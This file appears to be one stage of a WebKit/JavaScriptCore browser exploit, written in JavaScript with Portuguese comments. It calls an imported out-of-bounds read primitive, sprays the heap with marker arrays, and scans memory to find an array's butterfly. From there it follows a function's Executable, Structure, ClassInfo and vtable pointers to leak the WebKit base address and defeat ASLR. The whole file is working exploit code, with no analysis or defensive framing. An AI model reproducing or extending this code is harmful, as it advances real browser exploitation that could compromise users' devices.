// js/script3/testArrayBufferVictimCrash.mjs (v82_AdvancedGetterLeak - R43t - Direct Leak via Butterfly)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object, advInt64LessThanOrEqual } from '../utils.mjs';
import {
    triggerOOB_primitive,
    clearOOBEnvironment,
    arb_read,
    isOOBReady,
    selfTestOOBReadWrite,
} from '../core_exploit.mjs';
import { JSC_OFFSETS } from '../config.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "OriginalHeisenbug_TypedArrayAddrof_v82_AGL_R43_WebKitLeak";

const SPRAY_COUNT = 0x4000;
const MARKER_A_LOW = 0x41414141; 
const MARKER_A_HIGH = 0x00000001; // Inteiros pequenos são "boxed" com 0x1 na parte alta em alguns motores
const MARKER_A = new AdvancedInt64(MARKER_A_LOW, MARKER_A_HIGH);

const SCAN_HEAP_START_ADDRESS = new AdvancedInt64(0x0, 0x8A000000); 
const SCAN_HEAP_END_ADDRESS = new AdvancedInt64(0x0, 0x8D000000);   
const SCAN_STEP = 0x1000;

let spray_array = [];

function isValidPointer(ptr) {
    if (!isAdvancedInt64Object(ptr)) return false;
    if (ptr.high() === 0) return false; 
    return true;
}

export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
    const FNAME_CURRENT_TEST_BASE = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT}_R43t`;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Direct Leak via Butterfly ---`, "test");
    document.title = `${FNAME_CURRENT_TEST_BASE} Init...`;

    let final_result = {
        errorOccurred: null,
        heap_scan: { success: false, msg: "Not run.", found_addr: null },
        webkit_leak: { success: false, msg: "Not run.", webkit_base: null, func_addr: null, vtable_ptr: null }
    };

    try {
        logS3(`--- Fase 0 (R43t): Sanity Checks e Preparação ---`, "subtest");
        const coreOOBReadWriteOK = await selfTestOOBReadWrite(logS3);
        if (!coreOOBReadWriteOK) throw new Error("Sanity check OOB R/W falhou. Abortando.");
        await triggerOOB_primitive({ force_reinit: true });
        if (!isOOBReady()) throw new Error("Falha ao preparar ambiente OOB.");
        logS3("Sanity checks e ambiente OOB OK.", "good");

        // --- FASE 1: HEAP SPRAY ---
        logS3(`  --- Fase 1 (R43t): Pulverizando a Heap com ${SPRAY_COUNT} Arrays... ---`, "subtest");
        spray_array = [];
        for (let i = 0; i < SPRAY_COUNT; i++) {
            let arr = new Array(4);
            arr[0] = MARKER_A_LOW; // O motor vai "boxar" isso em um JSValue de 64 bits
            arr[1] = i; 
            arr[2] = {a: 1}; // Placeholder object
            arr[3] = () => {}; // Placeholder function
            spray_array.push(arr);
        }
        logS3(`  Heap Spray concluído.`, "good");
        await PAUSE_S3(200);

        // --- FASE 2: MEMORY SCAN ---
        logS3(`  --- Fase 2 (R43t): Varrendo a Memória em busca do valor mágico... ---`, "subtest");
        let found_butterfly_addr = null;
        let found_array_idx = -1;

        for (let addr = new AdvancedInt64(SCAN_HEAP_START_ADDRESS);
             advInt64LessThanOrEqual(addr, SCAN_HEAP_END_ADDRESS);
             addr = addr.add(SCAN_STEP)) {
            
            try {
                const val = await arb_read(addr, 8);
                // Um inteiro pequeno como 0x41414141 é geralmente "boxed" com a parte alta sendo 0x00000001
                if (isAdvancedInt64Object(val) && val.equals(MARKER_A)) {
                    const idx_val = (await arb_read(addr.add(8), 8)).low();
                    // Verificação de sanidade do índice
                    if(idx_val >= 0 && idx_val < SPRAY_COUNT) {
                        found_butterfly_addr = addr;
                        found_array_idx = idx_val;
                        final_result.heap_scan.success = true;
                        final_result.heap_scan.msg = `Encontrado butterfly do spray[${found_array_idx}] em ${found_butterfly_addr.toString(true)}`;
                        logS3(`[MemoryScan] SUCESSO! ${final_result.heap_scan.msg}`, "vuln");
                        break;
                    }
                }
            } catch (e) { /* Ignora erros */ }
        }
        if (!final_result.heap_scan.success) throw new Error("Falha ao encontrar o spray na memória.");
        

        // --- FASE 3: VAZAMENTO DA BASE DO WEBKIT ---
        logS3(`  --- Fase 3 (R43t): Lendo ponteiro da função e Vazando a Base do WebKit ---`, "subtest");
        
        // O elemento no índice 3 é a nossa função alvo. Vamos ler seu endereço do butterfly.
        const func_addr = await arb_read(found_butterfly_addr.add(3 * 8), 8);
        if (!isValidPointer(func_addr)) throw new Error(`Ponteiro para a função alvo no butterfly é inválido ou nulo: ${func_addr.toString(true)}`);
        final_result.webkit_leak.func_addr = func_addr.toString(true);
        logS3(`[WebKitLeak] Endereço da função alvo obtido: ${final_result.webkit_leak.func_addr}`, "leak");

        const executable_addr = await arb_read(func_addr.add(JSC_OFFSETS.JSFunction.EXECUTABLE_OFFSET), 8);
        if (!isValidPointer(executable_addr)) throw new Error(`Ponteiro para Executable inválido: ${executable_addr.toString(true)}`);
        logS3(`[WebKitLeak] Endereço do Executable: ${executable_addr.toString(true)}`, "leak");
        
        // Um 'Executable' é um JSCell, então podemos ler sua Structure
        const executable_structure_addr = await arb_read(executable_addr.add(JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET), 8);
        const class_info_addr = await arb_read(executable_structure_addr.add(JSC_OFFSETS.Structure.CLASS_INFO_OFFSET), 8);
        const vtable_ptr = await arb_read(class_info_addr, 8); // A vtable é geralmente o primeiro membro do ClassInfo
        if (!isValidPointer(vtable_ptr)) throw new Error(`Ponteiro para vtable inválido: ${vtable_ptr.toString(true)}`);
        
        final_result.webkit_leak.vtable_ptr = vtable_ptr.toString(true);
        logS3(`[WebKitLeak] Ponteiro para vtable: ${final_result.webkit_leak.vtable_ptr}`, "leak");
        
        const page_mask = new AdvancedInt64(~0xFFFFF, 0xFFFFFFFF); // Alinhamento de 1MB
        const webkit_base = vtable_ptr.and(page_mask);
        
        final_result.webkit_leak.webkit_base = webkit_base.toString(true);
        final_result.webkit_leak.success = true;
        final_result.webkit_leak.msg = `Candidato a base do WebKit: ${final_result.webkit_leak.webkit_base}`;
        logS3(`[WebKitLeak] SUCESSO! ${final_result.webkit_leak.msg}`, "vuln");
        document.title = `${FNAME_CURRENT_TEST_BASE}_SUCCESS!`;

    } catch (e_outer) {
        if (!final_result.errorOccurred) final_result.errorOccurred = `Erro geral: ${e_outer.message}`;
        logS3(`  CRITICAL ERROR na execução (R43t): ${e_outer.message || String(e_outer)}`, "critical");
        document.title = `${FNAME_CURRENT_TEST_BASE}_FAIL!`;
    } finally {
        await clearOOBEnvironment({ caller_fname: `${FNAME_CURRENT_TEST_BASE}-FinalClear` });
    }

    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Completed ---`, "test");
    logS3(`Resultado Final (R43t): ${JSON.stringify(final_result, null, 2)}`, "debug");
    return final_result;
}
